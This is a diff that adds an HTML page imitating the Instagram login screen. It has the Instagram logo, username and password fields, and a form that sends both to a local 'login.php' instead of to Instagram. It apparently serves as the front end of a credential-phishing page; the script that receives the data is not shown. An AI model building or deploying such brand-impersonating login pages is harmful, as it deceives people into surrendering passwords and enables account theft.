@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0; /* Elimina el margen por defecto */
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-box {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            width: 300px;
+            text-align: center;
+            border-radius: 5px; /* Añadido para bordes redondeados */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); /* Sombra suave */
+        }
+        .login-box img {
+            margin-bottom: 20px;
+            width: 180px;
+        }
+        .input-box {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 10px;
+        }
+        .input-box input {
+            padding: 10px;
+            margin-bottom: 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            width: 100%;
+            font-size: 14px;
+        }
+        .login-btn {
+            padding: 10px;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%; /* Asegura que el botón ocupe todo el ancho */
+        }
+        .login-btn:disabled {
+            background-color: #b2dffc;
+        }
+        .footer {
+            margin-top: 10px;
+        }
+        .footer a {
+            text-decoration: none;
+            color: #00376b;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram">
+            <form action="login.php" method="POST">
+                <div class="input-box">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button class="login-btn" type="submit">Log In</button>
+            </form>
+            <div class="footer">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
